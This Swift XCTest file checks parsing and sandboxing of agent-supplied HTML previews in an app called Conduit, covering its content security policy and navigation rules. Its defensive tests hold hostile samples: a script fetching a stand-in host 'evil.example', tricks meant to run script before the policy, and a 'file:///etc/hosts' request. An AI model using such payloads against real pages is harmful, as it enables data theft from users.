import WebKit
import XCTest
@testable import Conduit

/// Hermes' `::preview{file="…"}` directive: an agent's HTML file drawn in
/// the reply. These cover the pure pieces: which lines hold a preview, how
/// they parse into blocks, and the page built around the file.
///
/// An extension rather than its own class, for the same CI planner reason
/// as the media preview tests.
extension MarkdownLargeDocumentTests {

    // MARK: - Directive grammar

    func testHTMLPreview_DirectiveAloneOnItsLine() {
        XCTAssertEqual(
            TranscriptDirectives.segments(in: #"::preview{file="/root/.hermes/cache/reports/patch-status-chart.html"}"#),
            [.preview(file: "/root/.hermes/cache/reports/patch-status-chart.html")]
        )
        XCTAssertEqual(
            TranscriptDirectives.segments(in: "::preview{file='chart.html' height=\"480\"}"),
            [.preview(file: "chart.html")]
        )
    }

    func testHTMLPreview_DirectiveInsideASentenceKeepsTheText() {
        XCTAssertEqual(
            TranscriptDirectives.segments(in: #"Here it is ::preview{file="/tmp/a.html"} as asked."#),
            [.text("Here it is"), .preview(file: "/tmp/a.html"), .text("as asked.")]
        )
    }

    func testHTMLPreview_NotADirective() {
        XCTAssertNil(TranscriptDirectives.segments(in: "Plain text"))
        XCTAssertNil(TranscriptDirectives.segments(in: #"std::preview{file="/tmp/a.html"}"#))
        XCTAssertNil(TranscriptDirectives.segments(in: #"`::preview{file="/tmp/a.html"}`"#))
        XCTAssertNil(TranscriptDirectives.segments(in: "::preview{file=/tmp/a.html}"))
        XCTAssertNil(TranscriptDirectives.segments(in: #"::preview{file=""}"#))
    }

    func testHTMLPreview_HTMLExtensions() {
        XCTAssertTrue(TranscriptDirectives.isHTML("/tmp/chart.html"))
        XCTAssertTrue(TranscriptDirectives.isHTML("/tmp/CHART.HTM"))
        XCTAssertTrue(TranscriptDirectives.isHTML("/tmp/page.xhtml"))
        XCTAssertFalse(TranscriptDirectives.isHTML("/tmp/chart.svg"))
        XCTAssertFalse(TranscriptDirectives.isHTML("/tmp/chart.html.txt"))
    }

    func testHTMLPreview_ReadAloudSkipsPreviews() {
        let text = "Chart below.\n::preview{file=\"/tmp/a.html\"}\nDone."
        XCTAssertEqual(TranscriptDirectives.removingPreviews(from: text), "Chart below.\nDone.")
        let quoted = "> Example: ::preview{file=\"/tmp/a.html\"}"
        XCTAssertEqual(TranscriptDirectives.removingPreviews(from: quoted), quoted)
        let table = "::preview{file=\"/tmp/a.html\"} | x\n--- | ---\n1 | 2"
        XCTAssertEqual(TranscriptDirectives.removingPreviews(from: table), table)
        let crlfTable = table.replacingOccurrences(of: "\n", with: "\r\n")
        XCTAssertEqual(TranscriptDirectives.removingPreviews(from: crlfTable), table)
    }

    // MARK: - Parsing

    func testHTMLPreview_ParsesIntoAPreviewBlock() {
        let source = "Here is the chart:\n::preview{file=\"/root/report.html\"}\nAnything else?"
        let blocks = MarkdownParser.parse(source, recognizesGatewayMedia: true)
        XCTAssertEqual(blocks, [
            .paragraph("Here is the chart:"),
            .htmlPreview(path: "/root/report.html"),
            .paragraph("Anything else?")
        ])
    }

    func testHTMLPreview_OtherFilesGetTheirCard() {
        let blocks = MarkdownParser.parse("::preview{file=\"/tmp/plot.png\"}", recognizesGatewayMedia: true)
        XCTAssertEqual(blocks, [.image(url: "MEDIA: /tmp/plot.png", alt: "plot.png")])
    }

    func testHTMLPreview_StaysTextWithoutGatewayAccess() {
        let blocks = MarkdownParser.parse("::preview{file=\"/tmp/a.html\"}")
        XCTAssertEqual(blocks, [.paragraph("::preview{file=\"/tmp/a.html\"}")])
    }

    func testHTMLPreview_QuotedDirectiveIsAnExample() {
        let blocks = MarkdownParser.parse("> Example: ::preview{file=\"/tmp/a.html\"}", recognizesGatewayMedia: true)
        XCTAssertFalse(blocks.contains { if case .htmlPreview = $0 { return true } else { return false } }, "\(blocks)")
    }

    func testHTMLPreview_TableHeaderStaysATable() {
        let source = "::preview{file=\"/tmp/a.html\"} | x\n--- | ---\n1 | 2"
        let blocks = MarkdownParser.parse(source, recognizesGatewayMedia: true)
        XCTAssertFalse(blocks.contains { if case .htmlPreview = $0 { return true } else { return false } }, "\(blocks)")
    }

    func testHTMLPreview_CountsAsAWebPage() {
        XCTAssertEqual(MarkdownRichContentPolicy.webPageUnits(.htmlPreview(path: "/tmp/a.html")), MarkdownRichContentPolicy.diagramUnits)
        XCTAssertEqual(MarkdownRichContentPolicy.richUnits(.htmlPreview(path: "/tmp/a.html")), MarkdownRichContentPolicy.diagramUnits)
    }

    // MARK: - The page

    func testHTMLPreview_ThemeGoesIntoTheHeadAndScriptsBeforeBodyEnd() {
        let document = "<!DOCTYPE html><html><head><title>t</title></head><body><div>chart</div></body></html>"
        let page = HTMLPreviewPage.framed(document, theme: HTMLPreviewTheme(light: true), presentation: .inline)
        XCTAssertTrue(page.hasPrefix("<!DOCTYPE html><meta http-equiv=\"Content-Security-Policy\""), page)
        XCTAssertTrue(page.contains("<html><head><meta name=\"viewport\""), page)
        XCTAssertTrue(page.contains("--foreground:"))
        XCTAssertTrue(page.contains("color-scheme:light"))
        let scriptRange = page.range(of: HTMLPreviewPage.messageHandlerName)
        let bodyEnd = page.range(of: "</body>")
        XCTAssertNotNil(scriptRange)
        XCTAssertNotNil(bodyEnd)
        if let scriptRange, let bodyEnd { XCTAssertLessThan(scriptRange.lowerBound, bodyEnd.lowerBound) }
        XCTAssertTrue(page.hasSuffix("</body></html>"))
    }

    func testHTMLPreview_FragmentsAndDoctypeOnlyDocuments() {
        let fragment = HTMLPreviewPage.framed("<div>hi</div>", theme: HTMLPreviewTheme(light: false), presentation: .inline)
        XCTAssertTrue(fragment.hasPrefix("<meta http-equiv=\"Content-Security-Policy\""))
        XCTAssertTrue(fragment.contains("color-scheme:dark"))
        XCTAssertTrue(fragment.hasSuffix("</script>"))

        let doctype = HTMLPreviewPage.framed("<!doctype html>\n<div>hi</div>", theme: HTMLPreviewTheme(light: true), presentation: .inline)
        XCTAssertTrue(doctype.hasPrefix("<!doctype html><meta http-equiv=\"Content-Security-Policy\""), doctype)
    }

    func testHTMLPreview_FullScreenPageDoesNotReportHeight() {
        let page = HTMLPreviewPage.framed("<body>x</body>", theme: HTMLPreviewTheme(light: true), presentation: .fullScreen)
        XCTAssertFalse(page.contains("messageHandlers"))
        XCTAssertTrue(page.contains("window.hermes"))
    }

    func testHTMLPreview_DecodesTheDashboardDataURL() {
        let html = "<p>Ünïcode chart</p>"
        let dataURL = "data:text/html;base64," + Data(html.utf8).base64EncodedString()
        XCTAssertEqual(HTMLPreviewPage.decodedDocument(fromDataURL: dataURL), html)
        XCTAssertNil(HTMLPreviewPage.decodedDocument(fromDataURL: "data:text/html;base64,"))
        XCTAssertNil(HTMLPreviewPage.decodedDocument(fromDataURL: "not a data url"))
        let tooLarge = "data:text/html;base64," + Data(count: HTMLPreviewPage.maximumDocumentBytes + 3).base64EncodedString()
        XCTAssertNil(HTMLPreviewPage.decodedDocument(fromDataURL: tooLarge))
        let notUTF8 = "data:text/html;base64," + Data([0x3C, 0x70, 0x3E, 0xFF, 0xFE, 0xC3]).base64EncodedString()
        XCTAssertNil(HTMLPreviewPage.decodedDocument(fromDataURL: notUTF8))
    }

    func testHTMLPreview_InlineHeightIsBounded() {
        XCTAssertEqual(HTMLPreviewPage.clampedInlineHeight(10), HTMLPreviewPage.minimumInlineHeight)
        XCTAssertEqual(HTMLPreviewPage.clampedInlineHeight(320.2), 321)
        XCTAssertEqual(HTMLPreviewPage.clampedInlineHeight(5_000), HTMLPreviewPage.maximumInlineHeight)
    }

    func testHTMLPreview_NavigationStaysOnThePage() {
        let link = URL(string: "https://example.com/details")!
        // The page itself loads.
        XCTAssertTrue(HTMLPreviewPage.navigationDecision(url: URL(string: "about:blank"), isMainFrame: true, userTapped: false).allow)
        // No frame loads: a data:, blob: or web frame could send what the
        // page shows anywhere (#770).
        XCTAssertFalse(HTMLPreviewPage.navigationDecision(url: URL(string: "data:text/html,<p>x</p>"), isMainFrame: false, userTapped: false).allow)
        XCTAssertFalse(HTMLPreviewPage.navigationDecision(url: URL(string: "blob:null/1234"), isMainFrame: false, userTapped: false).allow)
        XCTAssertFalse(HTMLPreviewPage.navigationDecision(url: URL(string: "about:srcdoc"), isMainFrame: false, userTapped: false).allow)
        XCTAssertFalse(HTMLPreviewPage.navigationDecision(url: URL(string: "about:srcdoc"), isMainFrame: true, userTapped: false).allow)
        XCTAssertFalse(HTMLPreviewPage.navigationDecision(url: link, isMainFrame: false, userTapped: false).allow)
        XCTAssertFalse(HTMLPreviewPage.navigationDecision(url: URL(string: "http://example.com/"), isMainFrame: false, userTapped: false).allow)
        // A tapped link opens in the browser instead.
        let tapped = HTMLPreviewPage.navigationDecision(url: link, isMainFrame: true, userTapped: true)
        XCTAssertFalse(tapped.allow)
        XCTAssertEqual(tapped.openExternally, link)
        // A script moving the page away goes nowhere.
        let scripted = HTMLPreviewPage.navigationDecision(url: link, isMainFrame: true, userTapped: false)
        XCTAssertFalse(scripted.allow)
        XCTAssertNil(scripted.openExternally)
        // Other schemes never open.
        let phone = HTMLPreviewPage.navigationDecision(url: URL(string: "tel:123"), isMainFrame: true, userTapped: true)
        XCTAssertFalse(phone.allow)
        XCTAssertNil(phone.openExternally)
        XCTAssertFalse(HTMLPreviewPage.navigationDecision(url: URL(string: "file:///etc/hosts"), isMainFrame: false, userTapped: false).allow)
        // The app's own links never open from the page, tapped or not.
        for isMainFrame in [true, false] {
            let conduit = HTMLPreviewPage.navigationDecision(url: URL(string: "conduit://chat/abc"), isMainFrame: isMainFrame, userTapped: true)
            XCTAssertFalse(conduit.allow)
            XCTAssertNil(conduit.openExternally)
        }
    }

    // MARK: - What keeps an agent's script harmless (#770)

    // The page runs whatever script the agent sent. That's only safe while
    // these hold; loosening one turns the preview into a way into the app.
    func testHTMLPreview_WebViewKeepsNothingAndOnlyHearsTheHeight() {
        final class Handler: NSObject, WKScriptMessageHandler {
            func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {}
        }
        for reportsHeight in [true, false] {
            let configuration = HTMLPreviewWebView.configuration(reportsHeight: reportsHeight, handler: Handler())
            XCTAssertFalse(configuration.websiteDataStore.isPersistent)
            XCTAssertFalse(configuration.preferences.javaScriptCanOpenWindowsAutomatically)
            XCTAssertTrue(configuration.userContentController.userScripts.isEmpty)
        }
        XCTAssertEqual(HTMLPreviewPage.messageHandlerNames(reportsHeight: true), [HTMLPreviewPage.messageHandlerName])
        XCTAssertEqual(HTMLPreviewPage.messageHandlerNames(reportsHeight: false), [])
        XCTAssertNil(HTMLPreviewPage.baseURL, "a file: or https: base gives the page an origin to act from")
    }

    func testHTMLPreview_PageCannotSendDataOff() {
        let policy = HTMLPreviewPage.contentSecurityPolicy
        XCTAssertTrue(policy.contains("connect-src data: blob:"))
        XCTAssertTrue(policy.contains("frame-src 'none'"))
        XCTAssertTrue(policy.contains("worker-src 'none'"))
        XCTAssertTrue(policy.contains("form-action 'none'"))
        XCTAssertTrue(policy.contains("object-src 'none'"))
        XCTAssertFalse(policy.contains("https:") || policy.contains("http:") || policy.contains("*"))
        for presentation in [HTMLPreviewPage.Presentation.inline, .fullScreen] {
            let page = HTMLPreviewPage.framed("<html><head></head><body>x</body></html>", theme: HTMLPreviewTheme(light: true), presentation: presentation)
            XCTAssertTrue(page.hasPrefix("<meta http-equiv=\"Content-Security-Policy\" content=\"\(policy)\">"))
        }
    }

    func testHTMLPreview_UnicodeWhitespaceCannotPrecedeThePolicy() {
        let policyTag = "<meta http-equiv=\"Content-Security-Policy\""
        for prefix in ["\u{00A0}", "\u{2003}", "\u{2028}", " \u{00A0}", "\t\n\u{00A0}"] {
            let document = prefix + "<!doctype html><html><head></head><body><script>1</script></body></html>"
            for presentation in [HTMLPreviewPage.Presentation.inline, .fullScreen] {
                let page = HTMLPreviewPage.framed(document, theme: HTMLPreviewTheme(light: true), presentation: presentation)
                XCTAssertTrue(page.hasPrefix(policyTag), page)
                XCTAssertEqual(page.components(separatedBy: policyTag).count - 1, 1, "the policy is inserted once")
            }
        }
    }

    // A `<head>` after the file's first script, or inside a string or
    // comment, mustn't let that script run before the policy.
    func testHTMLPreview_PolicyComesBeforeAnyScriptOfTheFile() {
        let policyTag = "<meta http-equiv=\"Content-Security-Policy\""
        let hostile = [
            "<script>fetch('https://evil.example/')</script><html><head></head><body>chart</body></html>",
            "<script>var s = \"<head>\";</script><body>chart</body>",
            "<!-- <head> --><script>1</script><p>chart</p>",
            "<!doctype html><script>1</script><html><head></head><body>x</body></html>",
        ]
        for document in hostile {
            let page = HTMLPreviewPage.framed(document, theme: HTMLPreviewTheme(light: true), presentation: .inline)
            guard let policy = page.range(of: policyTag), let script = page.range(of: "<script") else {
                XCTFail(page)
                continue
            }
            XCTAssertLessThan(policy.lowerBound, script.lowerBound, page)
        }
    }
}
